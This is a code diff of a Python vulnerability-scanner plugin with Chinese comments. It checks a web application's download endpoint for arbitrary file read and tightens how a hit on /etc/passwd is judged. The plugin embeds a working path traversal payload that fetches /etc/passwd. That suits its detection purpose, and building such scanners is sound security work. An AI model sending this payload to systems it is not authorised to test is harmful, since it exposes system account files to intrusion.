@@ -2,7 +2,7 @@
 from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
 from core.http import join_url
 from lib.colors import no, ok
-from lib.matcher import match_all
+from lib.matcher import is_passwd_file
 from lib.reporter import emit
 from plugins.base import PluginBase
 
@@ -47,34 +47,41 @@ class FileReadPlugin(PluginBase):
 
         @param target: 目标主机，用于拼接下载接口地址
         @param session: 复用的 HTTP 会话对象
-        @return: ScanResult——响应同时含 'root' 与 ':/' 特征为 CONFIRMED，否则 SAFE
+        @return: ScanResult——200 且响应含 ≥2 个 /etc/passwd 账户行（root/系统账户）为 CONFIRMED，否则 SAFE
         """
         # 原 URL 拼接：self.url + '/common/...'（self.url 以 / 结尾，保留双斜杠特性）
         url = join_url(target, "/common/download/resource?resource=/profile/../../../../../../../etc/passwd")
         try:
-            file_read_use = session.get(url).text
+            resp = session.get(url)
         except Exception as e:
             emit(no("任意文件读取（网络异常）"))
             return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
-        # 判定 1:1 保留：'root' 与 ':/' 同时出现（AND 联合，过滤仅含 root 的噪声）
-        # 使用 match_all 统一降误报工具（agents.md §5）
-        if match_all(file_read_use, ["root", ":/"]):
-            emit(ok("存在任意文件读取漏洞"))
-            return ScanResult(
-                kind="vuln",
-                name=self.name,
-                severity=self.severity,
-                status=STATUS_CONFIRMED,
-                url=url,
-                evidence="响应含 root 与 :/ 特征（/etc/passwd）",
-                fix=self.fix,
-                # 结构化漏洞元数据：报告层按 vuln_type/payload_class 分类聚合统计
-                extra={
-                    "vuln_type": "arbitrary_file_read",
-                    "payload_class": "traversal_etc_passwd",
-                    "plugin_name": "file_read",
-                },
-            )
-        else:
-            emit(no("不存在任意文件读取漏洞"))
-            return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
+
+        text = resp.text or ""
+        code = getattr(resp, "status_code", 0)
+
+        # 旧实现判定为 match_all(text, ["root", ":/"])，缺陷：":/" 在任何含 URL 的页面里
+        # 必然出现（https:// 就含 :/），该条件实际退化为「响应含 root」，误报率高。
+        # 现复用 file_read_path 已有的 /etc/passwd 严格判定（正则匹配 passwd 行 + ≥2 账户行），
+        # 并补上 200 状态码校验：非 200（拦截页/错误页）不进入判定。
+        if code == 200:
+            hit, evidence = is_passwd_file(text)
+            if hit:
+                emit(ok("存在任意文件读取漏洞"))
+                return ScanResult(
+                    kind="vuln",
+                    name=self.name,
+                    severity=self.severity,
+                    status=STATUS_CONFIRMED,
+                    url=url,
+                    evidence=f"响应含真实 /etc/passwd 内容（{evidence}）",
+                    fix=self.fix,
+                    # 结构化漏洞元数据：报告层按 vuln_type/payload_class 分类聚合统计
+                    extra={
+                        "vuln_type": "arbitrary_file_read",
+                        "payload_class": "traversal_etc_passwd",
+                        "plugin_name": "file_read",
+                    },
+                )
+        emit(no("不存在任意文件读取漏洞"))
+        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
